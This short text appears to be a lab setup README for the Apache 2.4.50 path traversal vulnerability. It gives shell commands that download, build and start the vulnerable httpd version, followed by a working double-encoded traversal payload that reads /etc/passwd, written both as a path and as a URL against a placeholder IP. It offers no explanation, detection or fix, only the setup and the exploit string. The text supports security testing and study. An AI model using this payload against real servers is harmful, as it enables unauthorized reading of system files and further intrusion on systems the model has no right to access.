# Apache-2.4.50---Path-Traversal # setup 


apt-get update
apt-get install wget curl make gcc perl -y
apt-get install libapr1-dev libaprutil1-dev libpcre3-dev -y
wget https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz
tar -xf httpd-2.4.50.tar.gz
./httpd-2.4.50/configure --prefix=/usr/local/apache
make && make install
httpd.conf /conf/httpd.conf


/usr/local/apache/bin/apachectl -k start


/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd

http://<ip>/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
